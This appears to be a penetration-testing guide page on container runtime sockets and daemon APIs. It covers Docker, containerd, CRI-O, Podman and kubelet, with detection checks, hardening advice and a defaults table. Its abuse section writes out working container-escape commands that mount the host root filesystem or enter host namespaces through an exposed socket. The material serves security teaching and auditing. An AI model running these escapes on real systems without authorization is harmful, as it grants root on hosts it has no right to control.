# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Many real container compromises do not begin with a namespace escape at all. They begin with access to the runtime control plane. If a workload can talk to `dockerd`, `containerd`, CRI-O, Podman, or kubelet through a mounted Unix socket or an exposed TCP listener, the attacker may be able to request a new container with better privileges, mount the host filesystem, join host namespaces, or retrieve sensitive node information. In those cases, the runtime API is the real security boundary, and compromising it is functionally close to compromising the host.

This is why runtime socket exposure should be documented separately from kernel protections. A container with ordinary seccomp, capabilities, and MAC confinement can still be one API call away from host compromise if `/var/run/docker.sock` or `/run/containerd/containerd.sock` is mounted inside it. The kernel isolation of the current container may be working exactly as designed while the runtime management plane remains fully exposed.

## Daemon Access Models

Docker Engine traditionally exposes its privileged API through the local Unix socket at `unix:///var/run/docker.sock`. Historically it has also been exposed remotely through TCP listeners such as `tcp://0.0.0.0:2375` or a TLS-protected listener on `2376`. Exposing the daemon remotely without strong TLS and client authentication effectively turns the Docker API into a remote root interface.

containerd, CRI-O, Podman, and kubelet expose similar high-impact surfaces. The names and workflows differ, but the logic does not. If the interface lets the caller create workloads, mount host paths, retrieve credentials, or alter running containers, the interface is a privileged management channel and should be treated accordingly.

Common local paths worth checking are:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.

## Secure Remote Access

If a daemon must be exposed beyond the local socket, the connection should be protected with TLS and preferably with mutual authentication so the daemon verifies the client and the client verifies the daemon. The old habit of opening the Docker daemon on plain HTTP for convenience is one of the most dangerous mistakes in container administration because the API surface is strong enough to create privileged containers directly.

The historical Docker configuration pattern looked like:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

On systemd-based hosts, daemon communication may also appear as `fd://`, meaning the process inherits a pre-opened socket from systemd rather than binding it directly itself. The important lesson is not the exact syntax but the security consequence. The moment the daemon listens beyond a tightly permissioned local socket, transport security and client authentication become mandatory rather than optional hardening.

## Abuse

If a runtime socket is present, confirm which one it is, whether a compatible client exists, and whether raw HTTP or gRPC access is possible:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```

These commands are useful because they distinguish between a dead path, a mounted but inaccessible socket, and a live privileged API. If the client succeeds, the next question is whether the API can launch a new container with a host bind mount or host namespace sharing.

### Full Example: Docker Socket To Host Root

If `docker.sock` is reachable, the classical escape is to start a new container that mounts the host root filesystem and then `chroot` into it:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

This provides direct host-root execution through the Docker daemon. The impact is not limited to file reads. Once inside the new container, the attacker can alter host files, harvest credentials, implant persistence, or start additional privileged workloads.

### Full Example: Docker Socket To Host Namespaces

If the attacker prefers namespace entry instead of filesystem-only access:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

This path reaches the host by asking the runtime to create a new container with explicit host-namespace exposure rather than by exploiting the current one.

### Full Example: containerd Socket

A mounted `containerd` socket is usually just as dangerous:

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

The impact is again host compromise. Even if Docker-specific tooling is absent, another runtime API may still offer the same administrative power.

## Checks

The goal of these checks is to answer whether the container can reach any management plane that should have remained outside the trust boundary.

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```

What is interesting here:

- A mounted runtime socket is usually a direct administrative primitive rather than mere information disclosure.
- A TCP listener on `2375` without TLS should be treated as a remote-compromise condition.
- Environment variables such as `DOCKER_HOST` often reveal that the workload was intentionally designed to talk to the host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
